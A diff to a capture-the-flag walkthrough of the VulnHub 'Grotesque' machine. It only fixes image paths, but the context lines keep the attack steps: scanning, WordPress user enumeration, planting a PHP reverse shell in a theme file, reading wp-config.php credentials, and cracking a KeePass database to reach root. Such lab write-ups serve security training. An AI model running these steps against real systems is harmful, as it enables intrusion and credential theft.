@@ -3,7 +3,7 @@
 - **Machine:** Grotesque: 1.0.1
 - **Download:** https://www.vulnhub.com/entry/grotesque-101,658/
 
-![](866-1.png)
+![](images/866-1.png)
 
 ---
 
@@ -23,7 +23,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](866-2.png)
+![](images/866-2.png)
 
 ---
 
@@ -35,7 +35,7 @@ Run a comprehensive Nmap scan to identify open ports, services, OS information, 
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.139
 ```
 
-![](866-3.png)
+![](images/866-3.png)
 
 ---
 
@@ -59,7 +59,7 @@ Perform an aggressive scan and enumerate common web directories using the `http-
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.139
 ```
 
-![](866-4.png)
+![](images/866-4.png)
 
 ---
 
@@ -75,7 +75,7 @@ Visit the web service running on port **66**.
 
 View the page source.
 
-![](866-5.png)
+![](images/866-5.png)
 
 A Brainfuck-encoded string is discovered.
 
@@ -83,7 +83,7 @@ Decode it using:
 
 - https://www.dcode.fr/brainfuck-language
 
-![](866-6.png)
+![](images/866-6.png)
 
 ---
 
@@ -93,13 +93,13 @@ Visit:
 
 - http://192.168.2.139:66/sshpasswd.png
 
-![](866-7.png)
+![](images/866-7.png)
 
 The website also exposes a ZIP archive containing the project source.
 
-![](866-8.png)
+![](images/866-8.png)
 
-![](866-9.png)
+![](images/866-9.png)
 
 ---
 
@@ -111,7 +111,7 @@ Extract the archive.
 unzip vvmlist.zip
 ```
 
-![](866-10.png)
+![](images/866-10.png)
 
 Navigate into the extracted directory.
 
@@ -119,7 +119,7 @@ Navigate into the extracted directory.
 cd vvmlist.github.io
 ```
 
-![](866-11.png)
+![](images/866-11.png)
 
 Analyze the project files.
 
@@ -127,7 +127,7 @@ Analyze the project files.
 cat _vvmlist/* | sort | uniq
 ```
 
-![](866-12.png)
+![](images/866-12.png)
 
 The project reveals a hidden WordPress installation.
 
@@ -145,7 +145,7 @@ Run Gobuster.
 gobuster dir -u http://192.168.2.139/lyricsblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
 ```
 
-![](866-13.png)
+![](images/866-13.png)
 
 ---
 
@@ -155,7 +155,7 @@ Open the admin panel.
 
 - http://192.168.2.139/lyricsblog/wp-admin/
 
-![](866-14.png)
+![](images/866-14.png)
 
 Enumerate WordPress users.
 
@@ -163,7 +163,7 @@ Enumerate WordPress users.
 wpscan --url http://192.168.2.139/lyricsblog --enumerate u
 ```
 
-![](866-15.png)
+![](images/866-15.png)
 
 Discovered username:
 
@@ -177,11 +177,11 @@ erdalkomurcu
 
 Inspect the WordPress page.
 
-![](866-16.png)
+![](images/866-16.png)
 
 View the hidden content.
 
-![](866-17.png)
+![](images/866-17.png)
 
 Save the content locally.
 
@@ -189,7 +189,7 @@ Save the content locally.
 nano test.txt
 ```
 
-![](866-18.png)
+![](images/866-18.png)
 
 Generate its MD5 hash.
 
@@ -197,7 +197,7 @@ Generate its MD5 hash.
 md5sum test.txt
 ```
 
-![](866-19.png)
+![](images/866-19.png)
 
 Login using the recovered credentials.
 
@@ -208,13 +208,13 @@ Password : BC78C6AB38E114D6135409E44F7CDDA2
 
 - http://192.168.2.139/lyricsblog/wp-login.php
 
-![](866-20.png)
+![](images/866-20.png)
 
 Successful login.
 
 - http://192.168.2.139/lyricsblog/wp-admin/
 
-![](866-21.png)
+![](images/866-21.png)
 
 ---
 
@@ -228,7 +228,7 @@ Navigate to:
 Appearance → Theme File Editor → archive.php
 ```
 
-![](866-22.png)
+![](images/866-22.png)
 
 Replace the file contents with the PHP reverse shell.
 
@@ -314,7 +314,7 @@ proc_close($process);
 ?>
 ```
 
-![](866-23.png)
+![](images/866-23.png)
 
 Start a listener.
 
@@ -330,7 +330,7 @@ http://192.168.2.139/lyricsblog/wp-content/themes/twentytwentyone/archive.php
 
 A reverse shell is established.
 
-![](866-24.png)
+![](images/866-24.png)
 
 ---
 
@@ -348,7 +348,7 @@ List the files.
 ls -lh
 ```
 
-![](866-25.png)
+![](images/866-25.png)
 
 Read the WordPress configuration.
 
@@ -356,7 +356,7 @@ Read the WordPress configuration.
 cat wp-config.php
 ```
 
-![](866-26.png)
+![](images/866-26.png)
 
 Database credentials discovered:
 
@@ -371,7 +371,7 @@ Switch to the user.
 su raphael
 ```
 
-![](866-27.png)
+![](images/866-27.png)
 
 Spawn a fully interactive shell.
 
@@ -379,7 +379,7 @@ Spawn a fully interactive shell.
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-![](866-28.png)
+![](images/866-28.png)
 
 ---
 
@@ -391,7 +391,7 @@ List hidden files.
 ls -lha
 ```
 
-![](866-29.png)
+![](images/866-29.png)
 
 Transfer the KeePass database.
 
@@ -401,7 +401,7 @@ Start a web server:
 python3 -m http.server 8080
 ```
 
-![](866-30.png)
+![](images/866-30.png)
 
 Download the database.
 
@@ -409,7 +409,7 @@ Download the database.
 wget http://192.168.2.139:8080/.chadroot.kdbx
 ```
 
-![](866-31.png)
+![](images/866-31.png)
 
 Extract the KeePass hash.
 
@@ -417,7 +417,7 @@ Extract the KeePass hash.
 keepass2john .chadroot.kdbx > keepass.hash
 ```
 
-![](866-32.png)
+![](images/866-32.png)
 
 Crack it using John.
 
@@ -425,7 +425,7 @@ Crack it using John.
 john keepass.hash --wordlist=/opt/rockyou.txt
 ```
 
-![](866-33.png)
+![](images/866-33.png)
 
 Open the KeePass database.
 
@@ -433,7 +433,7 @@ Open the KeePass database.
 kpcli --kdb .chadroot.kdbx
 ```
 
-![](866-34.png)
+![](images/866-34.png)
 
 ---
 
@@ -457,7 +457,7 @@ List stored entries.
 ls
 ```
 
-![](866-35.png)
+![](images/866-35.png)
 
 Display every stored credential.
 
@@ -477,9 +477,9 @@ show 2
 show 3
 ```
 
-![](866-36.png)
+![](images/866-36.png)
 
-![](866-37.png)
+![](images/866-37.png)
 
 Recovered credentials:
 
@@ -500,7 +500,7 @@ Switch to the root account.
 su root
 ```
 
-![](866-38.png)
+![](images/866-38.png)
 
 Verify access.
 
@@ -518,7 +518,7 @@ cat user.txt
 F6ACB21652E095630BB1BEBD1E587FE7
 ```
 
-![](866-39.png)
+![](images/866-39.png)
 
 Navigate to the root directory.
 
@@ -542,7 +542,7 @@ cat root.txt
 AF7DD472654CBBCF87D3D7F509CB9862
 ```
 
-![](866-40.png)
+![](images/866-40.png)
 
 ---
 
